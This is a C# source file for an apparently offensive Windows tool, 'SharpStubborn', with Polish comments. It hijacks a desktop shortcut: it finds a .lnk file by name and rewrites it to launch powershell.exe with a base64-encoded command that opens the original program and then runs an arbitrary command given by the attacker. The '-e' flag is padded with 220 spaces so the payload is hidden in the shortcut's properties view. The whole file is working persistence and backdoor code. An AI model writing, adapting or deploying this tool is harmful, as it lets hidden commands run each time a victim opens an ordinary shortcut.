﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using IWshRuntimeLibrary;

namespace DesktopShortcutsLister
{
    class Program
    {
        static void Main(string[] args)
        {
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string[] shortcutFiles = Directory.GetFiles(desktopPath, "*.lnk");
            
            // Check if two arguments
            if (args.Length < 2)
            {
                Console.WriteLine("Usage: SharpStubborn <lnk name> <Komenda do wykonania>");
                return;
            }
            string searchQuery = args[0];
            string cmd = args[1];

            // Znajdź pierwszy skrót, którego nazwa zawiera frazę, ignorując wielkość liter
            string foundShortcutPath = null;
            foreach (var filePath in shortcutFiles)
            {
                string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(filePath);
                if (fileNameWithoutExtension.IndexOf(searchQuery, StringComparison.OrdinalIgnoreCase) >= 0)
                {
                    foundShortcutPath = filePath;
                    break;
                }
            }

            if (foundShortcutPath != null)
            {
                // Załaduj skrót, aby go zmodyfikować
                IWshRuntimeLibrary.WshShell shell = new IWshRuntimeLibrary.WshShell();
                IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(foundShortcutPath);

                Console.WriteLine("Znaleziono skrót:");
                Console.WriteLine($"Nazwa: {Path.GetFileNameWithoutExtension(foundShortcutPath)}");
                Console.WriteLine($"Ścieżka docelowa: {shortcut.TargetPath}");


                string newCmd = "start-process " + shortcut.TargetPath + " " + shortcut.Arguments.ToString() + ";" + cmd;

                byte[] newcmdBytes = Encoding.Unicode.GetBytes(newCmd);
                string encodednewCmd = Convert.ToBase64String(newcmdBytes);
                string newaArgument = "-e ".PadLeft(220) + encodednewCmd;
        

                //newTargetPath = @"C:\Windows\System32\cmd.exe";
                // Zmodyfikuj TargetPath
                shortcut.TargetPath = "powershell.exe";

                shortcut.Arguments = newaArgument;
   
                // Zapisz zmieniony skrót
                shortcut.Save();

                Console.WriteLine("Ścieżka docelowa została zaktualizowana.");
            }
            else
            {
                Console.WriteLine("Nie znaleziono skrótu pasującego do zapytania.");
            }
        }
    }
}